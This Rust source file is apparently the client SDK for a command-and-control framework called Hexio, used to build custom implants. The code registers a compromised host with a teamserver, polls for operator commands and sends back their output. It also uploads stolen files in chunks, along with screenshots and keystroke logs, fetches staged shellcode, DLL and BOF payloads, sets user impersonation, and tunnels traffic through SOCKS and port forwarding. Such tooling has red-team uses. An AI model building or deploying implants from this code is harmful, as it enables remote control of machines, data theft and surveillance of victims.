//! Hexio External Agent SDK for Rust.
//!
//! ```no_run
//! use hexio_sdk::{HexioClient, RegisterRequest};
//!
//! let mut client = HexioClient::new("http://10.0.0.1:9000", "my-passphrase");
//! let reg = client.register(RegisterRequest {
//!     hostname: "WORKSTATION".into(),
//!     ip: "10.0.0.50".into(),
//!     user: "admin".into(),
//!     os: "Windows 10".into(),
//!     process: "myagent.exe".into(),
//!     arch: "x64".into(),
//!     pid: 1234,
//!     client_type: "my_agent".into(),
//!     sleep_time: 5,
//! }).unwrap();
//! // client.token is now set
//!
//! loop {
//!     let checkin = client.checkin().unwrap();
//!     for cmd in checkin.commands {
//!         let output = format!("ran {}", cmd.command);
//!         client.command_response(cmd.id, &cmd.command, &output).unwrap();
//!     }
//!     std::thread::sleep(std::time::Duration::from_secs(5));
//! }
//! ```

use base64::{engine::general_purpose::STANDARD as B64, Engine};
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::collections::HashMap;
use std::time::Duration;
use thiserror::Error;

#[derive(Error, Debug)]
pub enum HexioError {
    #[error("transport error: {0}")]
    Transport(#[from] Box<ureq::Error>),
    #[error("io error: {0}")]
    Io(#[from] std::io::Error),
    #[error("json error: {0}")]
    Json(#[from] serde_json::Error),
    #[error("api error ({status}): {message}")]
    Api { status: u16, message: String },
}

pub type Result<T> = std::result::Result<T, HexioError>;

pub struct HexioClient {
    pub base_url: String,
    pub passphrase: String,
    pub token: Option<String>,
    pub agent_id: Option<i64>,
    pub agent: ureq::Agent,
}

impl HexioClient {
    pub fn new(base_url: impl Into<String>, passphrase: impl Into<String>) -> Self {
        let agent = ureq::AgentBuilder::new()
            .timeout(Duration::from_secs(30))
            .build();
        Self {
            base_url: base_url.into().trim_end_matches('/').to_string(),
            passphrase: passphrase.into(),
            token: None,
            agent_id: None,
            agent,
        }
    }

    fn request(&self, method: &str, path: &str, body: Option<&Value>) -> Result<Value> {
        let url = format!("{}{}", self.base_url, path);
        let mut req = self
            .agent
            .request(method, &url)
            .set("HexioExternalAgentAuth", &self.passphrase);

        if let Some(ref tok) = self.token {
            req = req.set("HexioAgentToken", tok);
        }

        let result = match body {
            Some(b) => {
                req = req.set("Content-Type", "application/json");
                req.send_json(b.clone())
            }
            None => req.call(),
        };

        match result {
            Ok(resp) => {
                let text = resp.into_string()?;
                if text.is_empty() {
                    Ok(Value::Object(serde_json::Map::new()))
                } else {
                    Ok(serde_json::from_str(&text)?)
                }
            }
            Err(ureq::Error::Status(code, resp)) => {
                let body = resp.into_string().unwrap_or_default();
                let message = serde_json::from_str::<Value>(&body)
                    .ok()
                    .and_then(|v| v.get("error").and_then(|e| e.as_str()).map(String::from))
                    .unwrap_or(body);
                Err(HexioError::Api {
                    status: code,
                    message,
                })
            }
            Err(e) => Err(HexioError::Transport(Box::new(e))),
        }
    }

    pub fn register(&mut self, req: RegisterRequest) -> Result<RegisterResponse> {
        let body = serde_json::to_value(&req)?;
        let resp: RegisterResponse = serde_json::from_value(self.request("POST", "/register", Some(&body))?)?;
        self.token = Some(resp.token.clone());
        self.agent_id = Some(resp.agent_id);
        Ok(resp)
    }

    pub fn checkin(&self) -> Result<CheckinResponse> {
        Ok(serde_json::from_value(self.request("GET", "/agent/checkin", None)?)?)
    }

    /// Full batched POST /agent/sync. If `req` is `None`, POSTs an empty body and the
    /// endpoint behaves identically to `/agent/checkin` (returns queued commands and
    /// any staged files).
    pub fn sync(&mut self, req: Option<&SyncRequest>) -> Result<SyncResponse> {
        let body = match req {
            Some(r) => Some(serde_json::to_value(r)?),
            None => None,
        };
        let raw = self.request("POST", "/agent/sync", body.as_ref())?;
        Ok(serde_json::from_value(raw)?)
    }

    /// Lower-level escape hatch. POSTs an arbitrary JSON payload to /agent/sync and
    /// returns the raw JSON response.
    pub fn sync_raw(&self, body: &Value) -> Result<Value> {
        self.request("POST", "/agent/sync", Some(body))
    }

    pub fn command_response(&self, command_id: i64, command: &str, response: &str) -> Result<Value> {
        let body = json!({
            "command_id": command_id,
            "command": command,
            "response": response,
        });
        self.request("POST", "/agent/command/response", Some(&body))
    }

    pub fn download_init(&self, req: DownloadInitRequest) -> Result<DownloadInitResponse> {
        let body = serde_json::to_value(&req)?;
        Ok(serde_json::from_value(self.request("POST", "/agent/download/init", Some(&body))?)?)
    }

    pub fn download_chunk(&self, download_id: &str, chunk: &[u8]) -> Result<Value> {
        let body = json!({
            "download_id": download_id,
            "chunk_data": B64.encode(chunk),
        });
        self.request("POST", "/agent/download/chunk", Some(&body))
    }

    pub fn download_cancel(&self, download_id: &str) -> Result<Value> {
        let body = json!({ "download_id": download_id });
        self.request("POST", "/agent/download/cancel", Some(&body))
    }

    pub fn download_file(&self, file_path: &str, data: &[u8], chunk_size: usize) -> Result<String> {
        let file_name = file_path.rsplit(['/', '\\']).next().unwrap_or(file_path);
        let chunk_size = chunk_size.max(1);
        let total_chunks = (data.len() + chunk_size - 1) / chunk_size;
        let init = self.download_init(DownloadInitRequest {
            file_name: file_name.into(),
            agent_path: file_path.into(),
            file_size: data.len() as i64,
            chunk_size: chunk_size as i64,
            total_chunks: total_chunks as i64,
        })?;
        for i in 0..total_chunks {
            let start = i * chunk_size;
            let end = (start + chunk_size).min(data.len());
            self.download_chunk(&init.download_id, &data[start..end])?;
        }
        Ok(init.download_id)
    }

    pub fn screenshot(&self, filename: &str, image: &[u8]) -> Result<Value> {
        let body = json!({
            "filename": filename,
            "data": B64.encode(image),
        });
        self.request("POST", "/agent/screenshot", Some(&body))
    }

    pub fn keylog(&self, filename: &str, data: &str) -> Result<Value> {
        let body = json!({ "filename": filename, "data": data });
        self.request("POST", "/agent/keylog", Some(&body))
    }

    pub fn set_impersonation(&self, user: &str) -> Result<Value> {
        let body = json!({ "user": user });
        self.request("POST", "/agent/impersonation", Some(&body))
    }

    pub fn clear_impersonation(&self) -> Result<Value> {
        self.set_impersonation("")
    }

    pub fn sidechannel(&self, channel_id: &str, data_b64: &str) -> Result<Value> {
        let body = json!({ "channel_id": channel_id, "data": data_b64 });
        self.request("POST", "/agent/sidechannel", Some(&body))
    }

    pub fn request_files(&self, req: FileRequest) -> Result<Value> {
        let body = serde_json::to_value(&req)?;
        self.request("POST", "/agent/files/request", Some(&body))
    }

    pub fn socks_open(&self, port: Option<i64>) -> Result<Value> {
        let body = match port {
            Some(p) => json!({ "port": p }),
            None => json!({}),
        };
        self.request("POST", "/agent/socks/open", Some(&body))
    }

    pub fn socks_close(&self) -> Result<Value> {
        self.request("POST", "/agent/socks/close", Some(&json!({})))
    }

    pub fn socks_sync(&self, data: &Value) -> Result<Value> {
        self.request("POST", "/agent/socks/sync", Some(data))
    }

    pub fn portfwd_open(&self, port: i64, remote_host: &str, remote_port: i64) -> Result<Value> {
        let body = json!({
            "port": port,
            "remote_host": remote_host,
            "remote_port": remote_port,
        });
        self.request("POST", "/agent/portfwd/open", Some(&body))
    }

    pub fn portfwd_close(&self, port: i64) -> Result<Value> {
        let body = json!({ "port": port });
        self.request("POST", "/agent/portfwd/close", Some(&body))
    }

    pub fn portfwd_sync(&self, data: &Value) -> Result<Value> {
        self.request("POST", "/agent/portfwd/sync", Some(data))
    }
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RegisterRequest {
    pub hostname: String,
    pub ip: String,
    pub user: String,
    pub os: String,
    pub process: String,
    pub arch: String,
    pub pid: i64,
    pub client_type: String,
    #[serde(default)]
    pub sleep_time: i64,
}

#[derive(Debug, Clone, Deserialize)]
pub struct RegisterResponse {
    pub agent_id: i64,
    pub token: String,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct Command {
    pub id: i64,
    pub command: String,
}

#[derive(Debug, Clone, Deserialize)]
pub struct CheckinResponse {
    #[serde(default)]
    pub commands: Vec<Command>,
    #[serde(default)]
    pub files: Vec<Value>,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct DownloadInitRequest {
    pub file_name: String,
    pub agent_path: String,
    pub file_size: i64,
    pub chunk_size: i64,
    pub total_chunks: i64,
}

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct DownloadInitResponse {
    pub download_id: String,
    pub agent_path: String,
}

#[derive(Debug, Clone, Default, Serialize)]
pub struct FileRequest {
    #[serde(skip_serializing_if = "Option::is_none")]
    pub bof_files: Option<Vec<String>>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub pe_files: Option<Vec<String>>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub dll_files: Option<Vec<String>>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub elf_files: Option<Vec<String>>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub macho_files: Option<Vec<String>>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub shellcode_files: Option<Vec<String>>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub hexlang: Option<Vec<String>>,
}

// --- Sync batch types ---

/// Update the agent's sleep interval and optional jitter.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct SleepUpdate {
    pub sleep_time: i64,
    #[serde(skip_serializing_if = "Option::is_none", default)]
    pub sleep_jitter: Option<i64>,
}

/// Result of a command execution being reported back to the teamserver.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct CommandResult {
    pub command_id: i64,
    pub command: String,
    pub response: String,
}

/// Side-channel payload from the agent. `data` is base64-encoded.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct SideChannelResponse {
    pub channel_id: String,
    pub data: String,
}

/// A single file chunk upload. `chunk_data` is base64-encoded.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct DownloadChunkUpload {
    pub download_id: String,
    pub chunk_data: String,
}

/// Screenshot upload. `data` is base64-encoded image bytes.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct ScreenshotUpload {
    pub filename: String,
    pub data: String,
}

/// Keylog upload. `data` is raw keystroke text.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct KeylogUpload {
    pub filename: String,
    pub data: String,
}

/// Inbound SOCKS data from the agent: `{ id, data }`. `data` is base64.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct SocksReceive {
    pub id: String,
    pub data: String,
}

/// Request half of `socks_sync`: sockids the agent closed and bytes it received
/// from the remote.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct SocksSyncRequest {
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub closes: Vec<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub receives: Vec<SocksReceive>,
}

/// A new SOCKS connection opened on the teamserver side that the agent must
/// dial out to.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct SocksOpenEntry {
    pub id: String,
    pub addr: String,
    pub port: i64,
    pub proto: String,
}

/// Outbound SOCKS payload to the agent. Note: the wire field in the response
/// is `send` (singular), not `sends`.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct SocksSend {
    pub id: String,
    pub data: String,
    pub size: i64,
}

/// Response half of `socks_sync`: new socket opens, closed sockids, and bytes
/// destined for the agent.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct SocksSyncResponse {
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub opens: Vec<SocksOpenEntry>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub closes: Vec<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub send: Vec<SocksSend>,
}

/// Request to open a new teamserver-side port forward listener.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct PortFwdOpenRequest {
    pub port: i64,
    pub remote_host: String,
    pub remote_port: i64,
}

/// Outbound port-forward data from the agent: bytes it read from the remote
/// and wants to hand back to the teamserver. Note wire field is `sockid`.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct PortFwdSend {
    #[serde(rename = "sockid")]
    pub sock_id: String,
    pub data: String,
    pub size: i64,
}

/// Per-port payload the agent sends in a `portfwd_sync` request entry.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct PortFwdInboundData {
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub opens: Vec<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub sends: Vec<PortFwdSend>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub closes: Vec<String>,
}

/// Single entry in the `portfwd_sync` request array.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct PortFwdSyncRequestEntry {
    pub port: i64,
    pub data: PortFwdInboundData,
}

/// Bytes the teamserver received on a forwarded port that the agent should
/// push into the corresponding remote socket.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct PortFwdRecv {
    #[serde(rename = "sockid")]
    pub sock_id: String,
    pub data: String,
    pub size: i64,
}

/// Per-port payload the teamserver returns in a `portfwd_sync` response entry.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct PortFwdOutboundData {
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub recvs: Vec<PortFwdRecv>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub closes: Vec<String>,
}

/// Single entry in the `portfwd_sync` response array.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct PortFwdSyncResponseEntry {
    pub port: i64,
    pub data: PortFwdOutboundData,
}

/// Unit type that always serializes to the empty JSON object `{}`. Used for
/// presence-triggered flags like `socks_open` / `socks_close` in `SyncRequest`.
#[derive(Debug, Clone, Copy, Default)]
pub struct Empty;

impl Serialize for Empty {
    fn serialize<S: serde::Serializer>(&self, serializer: S) -> std::result::Result<S::Ok, S::Error> {
        use serde::ser::SerializeMap;
        let map = serializer.serialize_map(Some(0))?;
        map.end()
    }
}

impl<'de> Deserialize<'de> for Empty {
    fn deserialize<D: serde::Deserializer<'de>>(deserializer: D) -> std::result::Result<Self, D::Error> {
        let _ = serde_json::Value::deserialize(deserializer)?;
        Ok(Empty)
    }
}

/// Full batched payload for `POST /agent/sync`. Every field is optional; only
/// set what you need. For `socks_open` / `socks_close`, use
/// [`SyncRequest::trigger_socks_open`] / [`SyncRequest::trigger_socks_close`]
/// (the server reads presence-of-key, so they serialize as `{}`).
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct SyncRequest {
    #[serde(skip_serializing_if = "Option::is_none", default)]
    pub sleep: Option<SleepUpdate>,
    #[serde(skip_serializing_if = "Option::is_none", default)]
    pub impersonation: Option<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub commands: Vec<CommandResult>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub side_channel_responses: Vec<SideChannelResponse>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub download_init: Vec<DownloadInitRequest>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub download_chunk: Vec<DownloadChunkUpload>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub download_cancel: Vec<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub screenshots: Vec<ScreenshotUpload>,
    #[serde(skip_serializing_if = "Option::is_none", default)]
    pub keylog: Option<KeylogUpload>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub bof_files: Vec<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub pe_files: Vec<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub dll_files: Vec<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub elf_files: Vec<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub macho_files: Vec<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub shellcode_files: Vec<String>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub hexlang: Vec<String>,
    #[serde(skip_serializing_if = "Option::is_none", default)]
    pub socks_open: Option<Empty>,
    #[serde(skip_serializing_if = "Option::is_none", default)]
    pub socks_open_port: Option<i64>,
    #[serde(skip_serializing_if = "Option::is_none", default)]
    pub socks_close: Option<Empty>,
    #[serde(skip_serializing_if = "Option::is_none", default)]
    pub socks_sync: Option<SocksSyncRequest>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub portfwd_open: Vec<PortFwdOpenRequest>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub portfwd_close: Vec<i64>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub portfwd_sync: Vec<PortFwdSyncRequestEntry>,
}

impl SyncRequest {
    /// Set the `socks_open` presence key so the teamserver opens the SOCKS proxy.
    pub fn trigger_socks_open(&mut self) {
        self.socks_open = Some(Empty);
    }

    /// Set the `socks_close` presence key so the teamserver closes the SOCKS proxy.
    pub fn trigger_socks_close(&mut self) {
        self.socks_close = Some(Empty);
    }
}

/// Acknowledgement of a single uploaded chunk.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct DownloadChunkAck {
    pub download_id: String,
    pub chunk_received: bool,
}

/// Result of a `portfwd_open` / `portfwd_close` operation.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct PortFwdOpCloseResult {
    pub port: i64,
    pub success: bool,
}

/// File staged on the teamserver that the agent should pick up.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct StagedFile {
    pub filename: String,
    pub filetype: String,
    pub alias: String,
    pub filedata: String,
}

/// Full response from `POST /agent/sync`. Only fields relevant to the request
/// are populated.
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct SyncResponse {
    #[serde(default)]
    pub commands: Vec<Command>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub files: Vec<StagedFile>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub download_init: Vec<DownloadInitResponse>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub download_chunk: Vec<DownloadChunkAck>,
    #[serde(default, skip_serializing_if = "HashMap::is_empty")]
    pub bof_files: HashMap<String, String>,
    #[serde(default, skip_serializing_if = "HashMap::is_empty")]
    pub pe_files: HashMap<String, String>,
    #[serde(default, skip_serializing_if = "HashMap::is_empty")]
    pub dll_files: HashMap<String, String>,
    #[serde(default, skip_serializing_if = "HashMap::is_empty")]
    pub elf_files: HashMap<String, String>,
    #[serde(default, skip_serializing_if = "HashMap::is_empty")]
    pub macho_files: HashMap<String, String>,
    #[serde(default, skip_serializing_if = "HashMap::is_empty")]
    pub shellcode_files: HashMap<String, String>,
    #[serde(default, skip_serializing_if = "HashMap::is_empty")]
    pub hexlang: HashMap<String, String>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub socks_open: Option<bool>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub socks_port: Option<i64>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub socks_close: Option<bool>,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub socks_sync: Option<SocksSyncResponse>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub portfwd_open: Vec<PortFwdOpCloseResult>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub portfwd_close: Vec<PortFwdOpCloseResult>,
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub portfwd_sync: Vec<PortFwdSyncResponseEntry>,
}
